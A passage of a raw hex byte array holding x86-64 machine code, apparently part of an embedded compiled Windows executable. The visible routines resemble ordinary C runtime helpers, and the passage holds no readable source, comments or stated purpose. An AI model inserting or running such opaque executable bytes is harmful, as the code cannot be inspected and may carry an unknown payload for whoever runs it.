0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xd1, 0x4d, 0x85, 0xc0, 0x74, 0x6a, 0xf7, 0xc1, 0x7, 0x0, 0x0, 0x0, 0x74, 0x1d, 0xf, 0xb6, 0x1, 0x3a, 0x4, 0xa, 0x75, 0x5d, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0x74, 0x52, 0x84, 0xc0, 0x74, 0x4e, 0x48, 0xf7, 0xc1, 0x7, 0x0, 0x0, 0x0, 0x75, 0xe3, 0x49, 0xbb, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x49, 0xba, 0xff, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0x8d, 0x4, 0xa, 0x25, 0xff, 0xf, 0x0, 0x0, 0x3d, 0xf8, 0xf, 0x0, 0x0, 0x77, 0xc0, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0xa, 0x75, 0xb7, 0x48, 0x83, 0xc1, 0x8, 0x49, 0x83, 0xe8, 0x8, 0x76, 0xf, 0x4d, 0x8d, 0xc, 0x2, 0x48, 0xf7, 0xd0, 0x49, 0x23, 0xc1, 0x49, 0x85, 0xc3, 0x74, 0xcf, 0x33, 0xc0, 0xc3, 0x48, 0x1b, 0xc0, 0x48, 0x83, 0xc8, 0x1, 0xc3, 0xcc, 0xcc, 0xcc, 0xe9, 0x23, 0xd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x4d, 0x85, 0xc0, 0x75, 0x18, 0x33, 0xc0, 0xc3, 0xf, 0xb7, 0x1, 0x66, 0x85, 0xc0, 0x74, 0x13, 0x66, 0x3b, 0x2, 0x75, 0xe, 0x48, 0x83, 0xc1, 0x2, 0x48, 0x83, 0xc2, 0x2, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe5, 0xf, 0xb7, 0x1, 0xf, 0xb7, 0xa, 0x2b, 0xc1, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x48, 0x7, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x7, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x0, 0x8b, 0xb, 0xe8, 0x84, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x8, 0x7, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xf, 0x33, 0xd2, 0x48, 0x8b, 0x9, 0xe8, 0xa6, 0x2, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x46, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0xc8, 0x6, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x47, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x8b, 0xf, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x9, 0xe8, 0x5e, 0x2, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0xfe, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x80, 0x6, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x7, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x89, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x1e, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x1, 0x83, 0xf8, 0x1, 0x75, 0x12, 0x48, 0x8d, 0x5, 0xd2, 0x31, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x6, 0xe8, 0x58, 0xc, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x9c, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x48, 0x89, 0x4d, 0xd8, 0x48, 0x8d, 0x45, 0xd8, 0x48, 0x89, 0x45, 0xe8, 0x4c, 0x8d, 0x4d, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0xe8, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x89, 0x45, 0x20, 0x89, 0x45, 0x28, 0x48, 0x8d, 0x45, 0xd8, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x45, 0xe0, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x89, 0x45, 0xd0, 0x89, 0x45, 0xd4, 0x48, 0x8d, 0x5, 0x3d, 0x47, 0x1, 0x0, 0x48, 0x89, 0x45, 0xe0, 0x89, 0x51, 0x28, 0x48, 0x8d, 0xd, 0x37, 0xa3, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x89, 0x8, 0x48, 0x8d, 0xd, 0x49, 0x31, 0x1, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x89, 0x90, 0xa8, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x89, 0x88, 0x88, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0x42, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x8d, 0x55, 0x28, 0x66, 0x89, 0x88, 0xbc, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x66, 0x89, 0x88, 0xc2, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x4d, 0x18, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x83, 0xa0, 0xa0, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x26, 0xfe, 0xff, 0xff, 0x4c, 0x8d, 0x4d, 0xd0, 0x4c, 0x8d, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0xd4, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0x91, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x50, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1a, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0xe, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x5a, 0xb, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8d, 0x45, 0xe8, 0x48, 0x89, 0x4d, 0xe8, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x15, 0x88, 0xa2, 0x0, 0x0, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x89, 0x45, 0x20, 0x89, 0x45, 0x28, 0x48, 0x8d, 0x45, 0xe8, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x89, 0x45, 0xe0, 0x89, 0x45, 0xe4, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0xc2, 0x74, 0xc, 0x48, 0x8b, 0xc8, 0xe8, 0xa, 0xb, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x70, 0xe8, 0xfd, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x58, 0xe8, 0xf0, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x60, 0xe8, 0xe3, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x68, 0xe8, 0xd6, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x48, 0xe8, 0xc9, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x50, 0xe8, 0xbc, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x78, 0xe8, 0xaf, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x89, 0x80, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x89, 0xc0, 0x3, 0x0, 0x0, 0xe8, 0x8f, 0xa, 0x0, 0x0, 0x4c, 0x8d, 0x4d, 0x20, 0x4c, 0x8d, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0x28, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0xd6, 0xfd, 0xff, 0xff, 0x4c, 0x8d, 0x4d, 0xe0, 0x4c, 0x8d, 0x45, 0xf8, 0x48, 0x8d, 0x55, 0xe4, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0x39, 0xfd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x40, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0x89, 0x90, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x2c, 0xe8, 0x1b, 0x3d, 0x0, 0x0, 0x48, 0x8b, 0x8f, 0x90, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0x75, 0x45, 0x1, 0x0, 0x74, 0x17, 0x48, 0x8d, 0x5, 0xd4, 0x34, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0xb, 0x83, 0x79, 0x10, 0x0, 0x75, 0x5, 0xe8, 0xf4, 0x3a, 0x0, 0x0, 0x48, 0x89, 0x9f, 0x90, 0x0, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x74, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x54, 0x3a, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0x48, 0x2f, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x2a, 0xe8, 0x3a, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1d, 0x8b, 0xd, 0x30, 0x2f, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x2d, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x6d, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0xb9, 0x9, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0x6b, 0x8e, 0x0, 0x0, 0x8b, 0xd, 0xf5, 0x2e, 0x1, 0x0, 0x33, 0xf6, 0x8b, 0xd8, 0x83, 0xf9, 0xff, 0x74, 0x1d, 0xe8, 0xe3, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0x48, 0x83, 0xf8, 0xff, 0x48, 0xf, 0x44, 0xfe, 0xeb, 0x72, 0x8b, 0xd, 0xcf, 0x2e, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0xca, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0x48, 0x8b, 0xfe, 0xeb, 0x5a, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xd6, 0x8, 0x0, 0x0, 0x8b, 0xd, 0xa8, 0x2e, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x9d, 0x27, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x32, 0x9, 0x0, 0x0, 0xeb, 0xce, 0x48, 0x8b, 0xd7, 0xe8, 0x8c, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x7e, 0x2e, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x7b, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0xc6, 0xfc, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x3, 0x9, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0xd3, 0x8d, 0x0, 0x0, 0x48, 0x85, 0xff, 0x74, 0x13, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x62, 0xf9, 0xff, 0xff, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0x30, 0x2e, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x1b, 0xe8, 0x22, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x8, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x78, 0xeb, 0x6d, 0x8b, 0xd, 0x10, 0x2e, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0xb, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x63, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x1c, 0x8, 0x0, 0x0, 0x8b, 0xd, 0xee, 0x2d, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0xe3, 0x26, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x78, 0x8, 0x0, 0x0, 0xeb, 0x36, 0x48, 0x8b, 0xd3, 0xe8, 0xd2, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0xc4, 0x2d, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0xc1, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xeb, 0xdb, 0x48, 0x8b, 0xcb, 0xe8, 0xc, 0xfc, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x49, 0x8, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xe8, 0xbf, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0xf3, 0x8c, 0x0, 0x0, 0x8b, 0xd, 0x7d, 0x2d, 0x1, 0x0, 0x33, 0xf6, 0x8b, 0xd8, 0x83, 0xf9, 0xff, 0x74, 0x1d, 0xe8, 0x6b, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0x48, 0x83, 0xf8, 0xff, 0x48, 0xf, 0x44, 0xfe, 0xeb, 0x72, 0x8b, 0xd, 0x57, 0x2d, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0x52, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0x48, 0x8b, 0xfe, 0xeb, 0x5a, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x5e, 0x7, 0x0, 0x0, 0x8b, 0xd, 0x30, 0x2d, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x25, 0x26, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xba, 0x7, 0x0, 0x0, 0xeb, 0xce, 0x48, 0x8b, 0xd7, 0xe8, 0x14, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x6, 0x2d, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x3, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0x4e, 0xfb, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x8b, 0x7, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0x5b, 0x8c, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0xbb, 0x2c, 0x1, 0x0, 0x33, 0xdb, 0x48, 0x8b, 0xf2, 0x83, 0xf9, 0xff, 0x74, 0x1b, 0xe8, 0xa8, 0x25, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x8, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x79, 0xeb, 0x6d, 0x8b, 0xd, 0x96, 0x2c, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0x91, 0x25, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x64, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xa2, 0x6, 0x0, 0x0, 0x8b, 0xd, 0x74, 0x2c, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x69, 0x25, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xfe, 0x6, 0x0, 0x0, 0xeb, 0x37, 0x48, 0x8b, 0xd7, 0xe8, 0x58, 0x25, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x4a, 0x2c, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x47, 0x25, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0x92, 0xfa, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0xcf, 0x6, 0x0, 0x0, 0x48, 0x69, 0xde, 0xc8, 0x3, 0x0, 0x0, 0x48, 0x3, 0xdf, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0x31, 0xfb, 0xff, 0xff, 0xe8, 0xec, 0x24, 0x0, 0x0, 0x89, 0x5, 0xfa, 0x2b, 0x1, 0x0, 0x83, 0xf8, 0xff, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x15, 0xe8, 0x54, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0xc, 0x0, 0x0, 0x0, 0xeb, 0xe9, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x8b, 0xd, 0xca, 0x2b, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0xc, 0xe8, 0xb4, 0x24, 0x0, 0x0, 0x83, 0xd, 0xb9, 0x2b, 0x1, 0x0, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8d, 0x15, 0x21, 0x39, 0x1, 0x0, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xca, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x98, 0x24, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x11, 0xff, 0x5, 0x32, 0x3b, 0x1, 0x0, 0xff, 0xc3, 0x83, 0xfb, 0xe, 0x72, 0xd3, 0xb0, 0x1, 0xeb, 0x9, 0x33, 0xc9, 0xe8, 0x24, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x63, 0xc1, 0x48, 0x8d, 0xc, 0x80, 0x48, 0x8d, 0x5, 0xda, 0x38, 0x1, 0x0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xcf, 0x8a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x1d, 0xf0, 0x3a, 0x1, 0x0, 0xeb, 0x1d, 0x48, 0x8d, 0x5, 0xb7, 0x38, 0x1, 0x0, 0xff, 0xcb, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xc8, 0xff, 0x15, 0xb7, 0x8a, 0x0, 0x0, 0xff, 0xd, 0xd1, 0x3a, 0x1, 0x0, 0x85, 0xdb, 0x75, 0xdf, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x63, 0xc1, 0x48, 0x8d, 0xc, 0x80, 0x48, 0x8d, 0x5, 0x86, 0x38, 0x1, 0x0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0x83, 0x8a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x89, 0x5c, 0x24, 0x30, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x48, 0x20, 0x39, 0x59, 0x8, 0x7c, 0x11, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x20, 0x23, 0x0, 0x0, 0x83, 0x7c, 0x24, 0x30, 0x1, 0x74, 0x5, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x31, 0x33, 0xff, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xf6, 0x75, 0x3b, 0xff, 0x15, 0xa, 0x8a, 0x0, 0x0, 0x89, 0x44, 0x24, 0x30, 0x40, 0x38, 0x7b, 0x10, 0x75, 0xa, 0x48, 0x89, 0x7b, 0x8, 0xc6, 0x43, 0x10, 0x1, 0xeb, 0x4, 0x48, 0x8b, 0x7b, 0x8, 0x48, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0xa5, 0xfd, 0xff, 0xff, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0xf0, 0x48, 0x89, 0x3, 0xff, 0x15, 0xdd, 0x89, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0x38, 0x5a, 0x10, 0x75, 0x18, 0xff, 0x15, 0x9e, 0x89, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x89, 0x5f, 0x8, 0xc6, 0x47, 0x10, 0x1, 0xff, 0x15, 0x96, 0x89, 0x0, 0x0, 0xeb, 0x4, 0x48, 0x8b, 0x5a, 0x8, 0x48, 0x8d, 0x4, 0xde, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0x10, 0xfb, 0xff, 0xff, 0x48, 0x81, 0xec, 0xf0, 0x5, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xa0, 0x29, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0xe0, 0x4, 0x0, 0x0, 0x41, 0x8b, 0xf8, 0x8b, 0xf2, 0x8b, 0xd9, 0x83, 0xf9, 0xff, 0x74, 0x5, 0xe8, 0x11, 0xb2, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x41, 0xb8, 0x98, 0x0, 0x0, 0x0, 0xe8, 0x83, 0xc0, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4d, 0x10, 0x41, 0xb8, 0xd0, 0x4, 0x0, 0x0, 0xe8, 0x72, 0xc0, 0xff, 0xff, 0x48, 0x8d, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0x8d, 0x45, 0x10, 0x48, 0x89, 0x44, 0x24, 0x50, 0xff, 0x15, 0x95, 0x88, 0x0, 0x0, 0x4c, 0x8b, 0xb5, 0x8, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xce, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x85, 0x88, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x36, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x8b, 0x54, 0x24, 0x40, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4d, 0x8b, 0xc6, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x33, 0xc9, 0xff, 0x15, 0x52, 0x88, 0x0, 0x0, 0x48, 0x8b, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x85, 0x8, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x8, 0x89, 0x74, 0x24, 0x70, 0x48, 0x89, 0x85, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0x8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x45, 0x80, 0x89, 0x7c, 0x24, 0x74, 0xff, 0x15, 0x21, 0x88, 0x0, 0x0, 0x33, 0xc9, 0x8b, 0xf8, 0xff, 0x15, 0x27, 0x88, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x14, 0x88, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x10, 0x85, 0xff, 0x75, 0xc, 0x83, 0xfb, 0xff, 0x74, 0x7, 0x8b, 0xcb, 0xe8, 0x1c, 0xb1, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xe0, 0x4, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0xf1, 0x76, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0xf0, 0x5, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x28, 0x49, 0x8b, 0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0xd, 0x59, 0x38, 0x1, 0x0, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 